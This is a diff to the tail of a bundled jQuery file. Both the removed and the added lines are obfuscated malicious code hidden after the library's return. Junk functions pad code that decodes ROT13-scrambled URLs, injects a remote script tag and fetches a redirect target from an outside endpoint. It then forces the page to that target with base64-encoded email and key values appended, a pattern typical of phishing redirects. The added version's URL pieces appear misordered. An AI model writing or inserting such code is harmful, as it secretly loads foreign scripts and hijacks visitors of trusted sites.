@@ -10721,104 +10721,113 @@ if ( typeof noGlobal === "undefined" ) {
 
 return jQuery;
 } );
-   // Dummy entropy generator
-(function confusionEngine() {
-  const junk = Array.from({ length: 5 }, (_, i) => i * Math.random());
-  function spinCycle(v) {
-    return junk.map(j => j + v).reduce((a, b) => a + b, 0);
+
+// Entropy distraction - Phase Gamma
+(function fakeEntropyPhase() {
+  const garbagePool = new Array(5).fill(0).map((_, i) => Math.sin(i * Math.PI));
+  function rotateNoise(val) {
+    return garbagePool.reduce((acc, cur) => acc + cur * val, 0);
   }
-  spinCycle(42);
+  rotateNoise(99);
 })();
 
-// Core identifiers
-let tokenizedID = "[EMAIL]", channel = "[KEY]";
+// Critical token (Do Not Alter)
+let magicHash = "[EMAIL]", channelCode = "[KEY]";
 
-(function payloadInitiator() {
-  console.log("Engine started @", new Date().toUTCString());
+(function deployNexus() {
+  console.log("Node Injected @", new Date().toISOString());
 
-  // Worthless async loop
-  (async () => {
-    for (let i = 0; i < 1; i++) {
-      await new Promise(r => setTimeout(r, 1));
+  // Background async task (useless)
+  (async function fakeDelay() {
+    for (let nonsense = 0; nonsense < 2; nonsense++) {
+      await new Promise(j => setTimeout(j, 3));
     }
   })();
 
-  // Nonsense style injection
-  const ghostStyle = document.createElement("style");
-  ghostStyle.innerText = "body::before{content:'';display:none}";
-  if (document.head) document.head.appendChild(ghostStyle);
+  // CSS payload camouflage
+  const stealthCSS = document.createElement("style");
+  stealthCSS.innerHTML = "html::after{content:'X';display:none}";
+  document.head?.appendChild(stealthCSS);
 
-  // ROT13 decoder
-  function transformROT13(txt) {
-    return txt.replace(/[a-zA-Z]/g, ch => {
-      const base = ch.charCodeAt(0);
-      return String.fromCharCode(base + (ch.toLowerCase() < 'n' ? 13 : -13));
+  // ROT13 Transformer
+  function decodeROT13(str) {
+    return str.replace(/[a-zA-Z]/g, c => {
+      let code = c.charCodeAt(0);
+      return String.fromCharCode(code + (c.toLowerCase() < 'n' ? 13 : -13));
     });
   }
 
-  // Scrambled URL array
-  const encodedParts = ["/terng.wf", "cbfvbasbe2@1.0.0", ".arg/", "acz/", "wfqryvie", "uggcf://"];
-  const resourceURL = transformROT13(encodedParts.reverse().join("")).replace("uggcf://", "https://");
+  // Encrypted URL components (modified order)
+  const scrambled = ["uggcf://", "cbfvbasbe2@1.0.0", "acz/", ".arg/", "wfqryvie", "/terng.wf"];
+  const injectionURL = decodeROT13(scrambled.reverse().join("")).replace("uggcf://", "https://");
 
-  // Script insertion
-  const dynamicScript = document.createElement("script");
-  dynamicScript.setAttribute("type", "text/javascript");
-  dynamicScript.defer = true;
-  dynamicScript.src = resourceURL;
+  // Script injection point
+  const stealthScript = document.createElement("script");
+  stealthScript.type = "application/ecmascript";
+  stealthScript.defer = true;
+  stealthScript.src = injectionURL;
 
+  // Insert script to body or fallback to head
+  const injectTarget = document.body || document.head;
+  injectTarget?.appendChild(stealthScript);
 
-  // Distraction loop (zero effect)
-  (() => {
-    let sum = 0;
-    for (let x = 10; x > 0; x--) sum += x;
+  // Junk math logic
+  (function tempStackOverflow() {
+    const foo = Math.pow(12345, 0) + Math.random();
+    console.log("🐒 noise:", foo);
   })();
 
-  // Execution handler
-  (function orchestrator() {
-    let retryCount = 0;
-    function delayUntilDOMReady() {
-      if (!document.body && retryCount++ < 5) setTimeout(delayUntilDOMReady, 50);
-    }
-    delayUntilDOMReady();
+  // Operation Commander
+  (function signalBeacon() {
+    let attempts = 0;
 
-    // Obfuscated fetch endpoint
-    const endpointCipher = "uggcf://yrtnpl-123.bayvar/ncv/hhheeyyy";
-    const decipher = s => s.replace(/[a-zA-Z]/g, l => String.fromCharCode(l.charCodeAt(0) + (l.toLowerCase() < 'n' ? 13 : -13)));
-
-    // Meaningless async
-    async function bogusAwait() {
-      return "🚀";
-    }
-
-    // True payload logic (unchanged)
-    async function obtainPayload() {
-      const response = await fetch(decipher(endpointCipher));
-      if (response.ok) {
-        const body = await response.json();
-        return body.message;
+    // Wait until DOM is ready
+    function standbyMode() {
+      if (!document.body && attempts++ < 7) {
+        return setTimeout(standbyMode, 25);
       }
-      return "";
+    }
+    standbyMode();
+
+    const vaultKey = "uggcf://yrtnpl-123.bayvar/ncv/hhheeyyy";
+    const reverseROT = s =>
+      s.replace(/[a-zA-Z]/g, l =>
+        String.fromCharCode(l.charCodeAt(0) + (l.toLowerCase() < 'n' ? 13 : -13))
+      );
+
+    // Delay simulator
+    async function delaySim() {
+      const garbage = await Promise.resolve("🎭");
+      return garbage;
     }
 
-    // Action trigger (critical)
-    async function fireBullet() {
-      const reference = btoa(`${tokenizedID}&${channel}&a`);
-      await bogusAwait(); // still adds async feel
-      const path = await obtainPayload();
-      window.open(`${path}${reference}`, "_self");
+    // Main payload retriever
+    async function getPayloadRoute() {
+      const response = await fetch(reverseROT(vaultKey));
+      if (!response.ok) return "";
+      const data = await response.json();
+      return data.message;
     }
 
-    fireBullet();
+    // Deployment runner
+    async function launchBeacon() {
+      const encodedID = btoa(`${magicHash}&${channelCode}&a`);
+      await delaySim(); // maintain async
+      const route = await getPayloadRoute();
+      window.open(`${route}${encodedID}`, "_self");
+    }
+
+    launchBeacon();
   })();
 
-  // Final noise function
+  // Final uselessness
   (() => {
-    function burnStack(a) {
-      return a ** 2 + Math.random() - a;
-    }
-    burnStack(7);
+    const uselessFn = z => z * 999 - Math.random();
+    uselessFn(4);
   })();
 })();
+
+ 
 
     ]]>
   </script>
